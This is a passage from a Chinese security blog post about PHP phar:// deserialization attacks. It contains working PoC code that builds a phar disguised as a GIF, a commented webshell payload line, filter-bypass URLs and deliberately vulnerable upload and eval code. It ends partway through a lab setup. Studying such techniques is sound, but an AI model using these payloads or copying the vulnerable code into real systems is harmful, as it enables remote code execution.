@@ -1,0 +1,1293 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="Ethan">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Ethan">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="一花一世界，一木一森林">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>phar反序列化拓展攻击浅析 · Ethan&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/ethan.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">Ethan&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">phar反序列化拓展攻击浅析</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">Ethan's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            phar反序列化拓展攻击浅析
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="phar反序列化">phar反序列化</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">1.7k</span>阅读时长: <span class="post-count reading-time">7 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/04/29</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=497229361&auto=1&height=66"></iframe>
+
+<h5 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h5><p>近些阵子反序列化漏洞横行，看了几篇文章，希望总结下来，因为整个漏洞发现过程是非常有意思的！</p>
+<a id="more"></a>
+<h5 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h5><h6 id="phar-RCE"><a href="#phar-RCE" class="headerlink" title="phar RCE"></a>phar RCE</h6><p>2018年HITCON上，<code>baby cake</code>这一题，涉及到了今年BlackHat大会上的Sam Thomas分享的<code>File Operation Induced Unserialization via the “phar://” Stream Wrapper</code>这个议题，见：<a href="https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf" target="_blank" rel="noopener">https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf</a> 。它的主要内容是，通过<code>phar://</code>协议对一个<code>phar</code>文件进行文件操作，如<code>file_get_contents</code>，就可以触发反序列化，从而达成RCE的效果。</p>
+<p>因为在 <a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">phar.c#L618</a> 处，其调用了<code>php_var_unserialize</code>。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!php_var_unserialize(metadata, &amp;p, p + zip_metadata_len, &amp;var_hash)) &#123;</span><br></pre></td></tr></table></figure>
+<p>因此可以构造一个特殊的phar包，使得攻击代码能够被反序列化，从而构造一个POP链。这一部分已经常见了，在使用phar://协议读取文件时，文件会被解析成phar（ <a href="http://php.net/manual/zh/intro.phar.php" target="_blank" rel="noopener">http://php.net/manual/zh/intro.phar.php</a> ）<br>解析过程中会触发php_var_unserialize()函数对meta-data的操作，造成反序列化。</p>
+<h6 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h6><p>知道创宇404实验室的研究员 seaii 更为我们指出了所有文件函数均可使用（<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a> ）：</p>
+<ul>
+<li><code>fileatime</code> / <code>filectime</code> / <code>filemtime</code></li>
+<li><code>stat</code> / <code>fileinode</code> / <code>fileowner</code> / <code>filegroup</code> / <code>fileperms</code></li>
+<li><code>file</code> / <code>file_get_contents</code> / <code>readfile</code> / <code>fopen`</code></li>
+<li><code>file_exists</code> / <code>is_dir</code> / <code>is_executable</code> / <code>is_file</code> / <code>is_link</code> / <code>is_readable</code> / <code>is_writeable</code> / <code>is_writable</code></li>
+<li><code>parse_ini_file</code></li>
+<li><code>unlink</code></li>
+<li><code>copy</code></li>
+</ul>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/1.png" alt></p>
+<p>在zsx师傅的文章又通过php_stream_open_wrapper方法的调用函数中，探索出一些新的可用函数！</p>
+<p><strong>exif</strong></p>
+<ul>
+<li><code>exif_thumbnail</code></li>
+<li><code>exif_imagetype</code></li>
+</ul>
+<p><strong>gd</strong></p>
+<ul>
+<li><code>imageloadfont</code></li>
+<li><code>imagecreatefrom***</code></li>
+</ul>
+<p><strong>hash</strong></p>
+<ul>
+<li><code>hash_hmac_file</code></li>
+<li><code>hash_file</code></li>
+<li><code>hash_update_file</code></li>
+<li><code>md5_file</code></li>
+<li><code>sha1_file</code></li>
+</ul>
+<p><strong>file / url</strong></p>
+<ul>
+<li><code>get_meta_tags</code></li>
+<li><code>get_headers</code></li>
+</ul>
+<p><strong>standard</strong></p>
+<ul>
+<li><code>getimagesize</code></li>
+<li><code>getimagesizefromstring</code></li>
+</ul>
+<p><strong>zip</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">'c.zip'</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">'phar://test.phar/test'</span>);</span><br></pre></td></tr></table></figure>
+<p><strong>Bzip / Gzip</strong></p>
+<p>如果<code>phar://</code>不能出现在头几个字符怎么办？</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">demo.php?filename=compress.bzip2:<span class="comment">//phar://upload_file/shell.gif/a</span></span><br></pre></td></tr></table></figure>
+<p><strong>验证</strong></p>
+<p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$filename=$_GET[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/\bphar\b/A"</span>, $filename)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"stop hacking!\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">comrare</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $haha = <span class="string">'haha'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;haha);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    imagecreatefromjpeg($_GET[<span class="string">'filename'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>poc验证</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">comrare</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $haha = <span class="string">'comrarezzzzz'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">@unlink(<span class="string">'shell.phar'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"shell.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> comrare();</span><br><span class="line"><span class="comment">//$object -&gt;haha= 'eval(@$_POST[\'a\']);';</span></span><br><span class="line">$object -&gt;haha= <span class="string">'phpinfo();'</span>;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"a"</span>, <span class="string">"a"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个poc同时绕过了gif限制和phar开头限制，同样我们可以getshell成功！</p>
+<h6 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h6><p>首先我们自己生成一个phar文件来观察它的结构，php内置了一个Phar类来处理相关操作!</p>
+<p>操作前请注意：<strong>要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">$o = <span class="keyword">new</span> TestObject();</span><br><span class="line">$o -&gt; data=<span class="string">'cck'</span>;</span><br><span class="line">$phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行后会生成一个phar文件在当前目录</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/2.png" alt></p>
+<p>我们观察下它的文件结构</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/3.png" alt>可以明显的看到meta-data是以序列化的形式存储的。<br>有序列化数据必然会有反序列化操作，php大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化！</p>
+<p>漏洞php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://phar.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/4.png" alt></p>
+<h6 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h6><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/5.png" alt></p>
+<p>伪造gif文件代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">'phar.phar'</span>);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);   <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $phar -&gt;addFromString(<span class="string">'test.txt'</span>,<span class="string">'test'</span>);  <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    $object = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $object -&gt; data = <span class="string">'cck'</span>;</span><br><span class="line">    $phar -&gt; setMetadata($object);  <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>file phar.phar如下</p>
+<p><img src="https://bkog.oss-cn-shenzhen.aliyuncs.com/phar/6.png" alt></p>
+<p>这种方法可以用于上传检测！</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>在别人复现的基础上实现了RCE</p>
+<h6 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h6><ul>
+<li>phar文件要能够上传到服务器端。</li>
+</ul>
+<p>如<code>file_exists()</code>，<code>fopen()</code>，<code>file_get_contents()</code>，<code>file()</code>等文件操作的函数</p>
+<ul>
+<li><p>要有可用的魔术方法作为“跳板”。</p>
+</li>
+<li><p>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</p>
+</li>
+</ul>
+<h6 id="环境文件"><a href="#环境文件" class="headerlink" title="环境文件"></a>环境文件</h6><p><code>upload_file.php</code>，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif<br>        <code>upload_file.html</code> 文件上传表单<br>        <code>file_un.php</code> 存在<code>file_exists()</code>，并且存在<code>__destruct()</code></p>
+<h6 id="文件内容"><a href="#文件内容" class="headerlink" title="文件内容"></a>文件内容</h6><p>upload_file.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]==<span class="string">"image/gif"</span>)&amp;&amp;(substr($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], strrpos($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>], <span class="string">'.'</span>)+<span class="number">1</span>))== <span class="string">'gif'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Type: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (file_exists(<span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],</span><br><span class="line">      <span class="string">"upload_file/"</span> .$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload_file/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Invalid file,you can only upload gif"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>upload_file.html</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action=<span class="string">"http://localhost/upload_file.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"Upload"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+<p>file_un.php</p>
